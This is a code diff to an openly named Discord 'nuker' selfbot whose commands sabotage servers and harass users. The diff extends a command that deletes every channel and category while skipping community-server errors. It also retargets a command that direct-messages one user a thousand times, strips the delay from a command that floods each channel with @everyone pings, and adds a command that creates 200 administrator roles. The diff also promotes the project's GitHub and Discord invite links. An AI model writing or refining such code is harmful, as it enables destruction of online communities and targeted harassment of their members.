@@ -90,6 +90,7 @@ async def say(ctx, channel: discord.TextChannel, *, message):
     await ok.delete()
 
 
+
 @bot.command(name='trash')
 async def trash(ctx):
   await ctx.message.delete()
@@ -97,18 +98,66 @@ async def trash(ctx):
   await asyncio.sleep(1)
   await lol.delete()
   g = ctx.guild
-  gg = g.get_member(970520276209111081)
+  gg = g.get_member(891209569764794388)
   for i in range(1000):
-    await gg.send("<@970520276209111081> **NUKERR ??** 😈")
+    await gg.send("<@891209569764794388> **NUKERR ??** 😈")
 
 
 @bot.command()
 async def delete(ctx):
   await ctx.message.delete()
   for c in ctx.guild.text_channels:
-    await c.delete()
+    try:
+        await c.delete()
+    except discord.errors.HTTPException as e:
+        if e.status == 400 and e.code == 50074:
+            # This is the specific error code for community channels
+            print(f"Skipped deletion of channel {c.name} as it's required for community servers.")
+        else:
+            # If it's a different HTTPException, re-raise the error
+            raise e
   for vc in ctx.guild.voice_channels:
-    await vc.delete()
+    try:
+        await vc.delete()
+    except discord.errors.HTTPException as e:
+        if e.status == 400 and e.code == 50074:
+            # This is the specific error code for community channels
+            print(f"Skipped deletion of voice channel {vc.name} as it's required for community servers.")
+        else:
+            # If it's a different HTTPException, re-raise the error
+            raise e
+
+
+  for stage_channel in ctx.guild.stage_channels:
+    try:
+        await stage_channel.delete()
+    except discord.errors.HTTPException as e:
+        if e.status == 400 and e.code == 50074:
+            print(f"Skipped deletion of stage channel {stage_channel.name} as it's required for community servers.")
+        else:
+            raise e
+
+  for nsfw_channel in ctx.guild.text_channels:
+    if nsfw_channel.is_nsfw():
+        try:
+            await nsfw_channel.delete()
+        except discord.errors.HTTPException as e:
+            if e.status == 400 and e.code == 50074:
+                print(f"Skipped deletion of NSFW channel {nsfw_channel.name} as it's required for community servers.")
+            else:
+                raise e
+  for cat in ctx.guild.categories:
+    try:
+        await cat.delete()
+    except discord.errors.HTTPException as e:
+        if e.status == 400 and e.code == 50074:
+            # This is the specific error code for community channels
+            print(f"Skipped deletion of category {cat.name} as it's required for community servers.")
+        else:
+            # If it's a different HTTPException, re-raise the error
+            raise e
+
+  await ctx.guild.create_text_channel("deleted")
 
 @bot.command()
 async def create(ctx):
@@ -116,13 +165,182 @@ async def create(ctx):
   for i in range(100):
     await ctx.guild.create_text_channel("nuked-and-fucked-up")
 
+
+@bot.command()
+async def setup(ctx):
+    category_data = {
+        '👋 - Reception': ['🍁・Overview', '📚・Guidelines', '🚀・Server-Boosts', '💫・Level-ups', '🎯・Self-Intro'],
+        '✈️ - Dashboard': ['📢・Statements', '🎬・Yt-Uploads', '🔔・Updates', '🎭・Texture-Pack', '📊・Polls', '📋・Staff-Info'],
+        '🌍 - Community': ['💬・Chat', '📸・Media-share', '🤖・Bot-cmds', '🎨・Art-Showcase', '💎・Boosters-Chat', '👾・Bot-Games'],
+        '🔊 - Voice Chats': ['🎤・vc-remote', '🎙️・Stage'],
+        '☎️ - Help Desk': ['💭・Opinions', '🎫・Tickets'],
+        # STAFF ZONE (PRIVATE)
+        '🚨 - Staffs Area': ['📕・Staff-Guidelines', '📢・Staff-Annc', '💬・Staff-chat', '🤖・Staff-cmd', '🛎️・Staff-works', '📝・Leave-app'],
+        '🛠️ - Server Logs': ['🔐・server-log', '🔐・members-log', '🔐・channels-log', '🔐・roles-log', '🔐・message-logs']
+    }
+    voice_channels = ['🎙️・General VC', '🎙️・Gaming VC', '🎙️・Boosters VC']
+
+    await ctx.message.delete()
+
+    for c in ctx.guild.text_channels:
+      try:
+          await c.delete()
+      except discord.errors.HTTPException as e:
+          if e.status == 400 and e.code == 50074:
+              # This is the specific error code for community channels
+              print(f"Skipped deletion of channel {c.name} as it's required for community servers.")
+          else:
+              # If it's a different HTTPException, re-raise the error
+              raise e
+
+    for vc in ctx.guild.voice_channels:
+      try:
+          await vc.delete()
+      except discord.errors.HTTPException as e:
+          if e.status == 400 and e.code == 50074:
+              # This is the specific error code for community channels
+              print(f"Skipped deletion of voice channel {vc.name} as it's required for community servers.")
+          else:
+              # If it's a different HTTPException, re-raise the error
+              raise e
+
+
+    for stage_channel in ctx.guild.stage_channels:
+      try:
+          await stage_channel.delete()
+      except discord.errors.HTTPException as e:
+          if e.status == 400 and e.code == 50074:
+              print(f"Skipped deletion of stage channel {stage_channel.name} as it's required for community servers.")
+          else:
+              raise e
+
+    for nsfw_channel in ctx.guild.text_channels:
+      if nsfw_channel.is_nsfw():
+          try:
+              await nsfw_channel.delete()
+          except discord.errors.HTTPException as e:
+              if e.status == 400 and e.code == 50074:
+                  print(f"Skipped deletion of NSFW channel {nsfw_channel.name} as it's required for community servers.")
+              else:
+                  raise e
+
+  
+    for cat in ctx.guild.categories:
+      try:
+          await cat.delete()
+      except discord.errors.HTTPException as e:
+          if e.status == 400 and e.code == 50074:
+              # This is the specific error code for community channels
+              print(f"Skipped deletion of category {cat.name} as it's required for community servers.")
+          else:
+              # If it's a different HTTPException, re-raise the error
+              raise e
+
+    await asyncio.sleep(1)
+
+    # Create new channels and categories
+    for category_name, text_channels in category_data.items():
+        # Check if the category already exists
+        category = discord.utils.get(ctx.guild.categories, name=category_name)
+        if category is None:
+            # Make 'Staffs Area' and 'Server Logs' categories private
+            if category_name in ['🚨 - Staffs Area', '🛠️ - Server Logs']:
+                category = await ctx.guild.create_category(category_name, overwrites={ctx.guild.default_role: discord.PermissionOverwrite(view_channel=False)})
+            else:
+                category = await ctx.guild.create_category(category_name)
+
+        for channel_name in text_channels:
+            # Check if the text channel already exists
+            text_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
+            if text_channel is None:
+                # Modify conditions based on channel names to set specific channel types
+                if channel_name == '🎙️・Stage':
+                    await category.create_stage_channel(channel_name)
+                elif channel_name in ['📢・Statements', '🎬・Yt-Uploads', '🔔・Updates', '🎭・Texture-Pack', '📊・Polls', '📋・Staff-Info']:
+                    await category.create_text_channel(channel_name)
+                elif channel_name == '💭・Opinions':
+                    await category.create_text_channel(channel_name, topic='Discussion and Opinions')
+                else:
+                    await category.create_text_channel(channel_name)
+
+        if category_name == '🔊 - Voice Chats':
+            for channel_name in voice_channels:
+                # Check if the voice channel already exists
+                if channel_name == '🎤・vc-remote':
+                    # Create 'vc-remote' as a text channel
+                    text_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
+                    if text_channel is None:
+                        await category.create_text_channel(channel_name)
+                else:
+                    # Create other voice channels in the 'Voice Chats' category
+                    voice_channel = discord.utils.get(ctx.guild.voice_channels, name=channel_name)
+                    if voice_channel is None:
+                        await category.create_voice_channel(channel_name)
+
+    await ctx.send('Auto setup complete.')
+
+
+
+@bot.command()
+async def setuproles(ctx):
+    role_data = {
+        'Admin': discord.Permissions.all(),
+        'Moderator': discord.Permissions(
+            kick_members=True,
+            ban_members=True,
+            manage_channels=True,
+            manage_roles=True
+        ),
+        'Member': discord.Permissions(
+            read_messages=True,
+            send_messages=True,
+            read_message_history=True
+        ),
+        'Guest': discord.Permissions(
+            read_messages=True,
+            send_messages=True
+        )
+    }
+
+    # Check if the bot has the necessary permissions to manage roles
+    if ctx.guild.me.guild_permissions.manage_roles:
+        try:
+            await ctx.message.delete()
+
+            # Get the bot's member object
+            bot_member = ctx.guild.get_member(bot.user.id)
+
+            # Fetch roles asynchronously
+            roles_to_delete = [
+                role for role in reversed(ctx.guild.roles)
+                if role.name != '@everyone' and bot_member.top_role > role
+            ]
+
+            # Delete existing roles
+            for role in roles_to_delete:
+                await role.delete()
+
+            await asyncio.sleep(1)  # Sleep to allow time for role deletion
+
+            # Create new roles
+            for role_name, permissions in role_data.items():
+                await ctx.guild.create_role(name=role_name, permissions=permissions)
+
+            await ctx.send('Roles setup complete.')
+        except discord.Forbidden:
+            await ctx.send("I don't have the necessary permissions to manage roles in this server.")
+        except discord.HTTPException as e:
+            await ctx.send(f"An error occurred: {e}")
+    else:
+        await ctx.send("I don't have the necessary permissions to manage roles in this server.")
+
+
+
 @bot.command()
 async def nuke(ctx):
   await ctx.message.delete()
   for c in ctx.guild.text_channels:
     for i in range(1000):
-      await c.send("@everyone nuked and fucked up")
-      await asyncio.sleep(1)
       await c.send("@everyone nuked and fucked up")
 
 
@@ -185,7 +403,10 @@ nsfwn (best command)
 nsfwwaifu
 nsfwneko
 nsfwtrap
-```""", timestamp = ctx.message.created_at, color=0x2f3136)
+```
+>>> ** [Github](https://github.com/NumbOp/SelfBot-Nuker) **
+ ** [Discord](https://discord.gg/2Bjbnc2ep4) **
+""", timestamp = ctx.message.created_at, color=0x2f3136)
 
   embed.set_author(name="Developer : Numb <$", icon_url="https://images-ext-2.discordapp.net/external/_NpHPRjMUISbs0iJU5WnMkk0TwtXHZsA-d1aiSiQL4A/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1100442444170018906/bf640377c474b9c15957f7d3f575b35c.png?format=webp&quality=lossless&width=479&height=479")
   embed.set_thumbnail(url=bot.user.avatar.url)
@@ -331,7 +552,10 @@ create
 spam <amt> <msg>
 prune
 dm <msg>
-  ```""", timestamp = ctx.message.created_at, color=0x2f3136)
+```
+>>> ** [Github](https://github.com/NumbOp/SelfBot-Nuker) **
+ ** [Discord](https://discord.gg/2Bjbnc2ep4) **
+ """, timestamp = ctx.message.created_at, color=0x2f3136)
 
   embed.set_author(name="Developer : Numb <$", icon_url=bot.user.avatar.url)
   embed.set_thumbnail(url=bot.user.avatar.url)
@@ -451,6 +675,20 @@ async def admin(ctx):
   role = discord.utils.get(guild.roles, name="$")
   await member.add_roles(role)
   print ("Admin Given!")
+
+
+
+@bot.command()
+async def roles(ctx):
+  guild = ctx.message.guild
+  perms = discord.Permissions(8)
+  await ctx.message.delete()
+  role = discord.utils.get(guild.roles, name="NUMB ON TOP")
+  for members in guild.members:
+    await members.add_roles(role)
+  #member = ctx.message.author
+  for i in range(200):
+    await guild.create_role(name='NUMB ON TOP', permissions=perms)
 
 
 
